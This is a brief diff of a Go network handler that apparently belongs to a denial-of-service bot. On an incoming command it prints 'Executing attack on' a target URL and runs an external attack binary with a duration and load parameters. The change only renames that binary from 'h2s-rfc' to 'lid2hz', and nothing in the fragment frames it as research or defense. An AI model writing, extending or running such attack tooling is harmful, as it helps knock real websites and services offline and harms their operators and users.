@@ -66,7 +66,7 @@ func handleConnection(conn net.Conn) {
 			fmt.Printf("Executing attack on %s for %s seconds\n", url, attackTime)
 			
 			// Execute the h2s-rfc command
-			cmd := exec.Command("./h2s-rfc", url, attackTime, "10", "100")
+			cmd := exec.Command("./lid2hz", url, attackTime, "10", "100")
 			cmd.Stdout = os.Stdout
 			cmd.Stderr = os.Stderr
 			
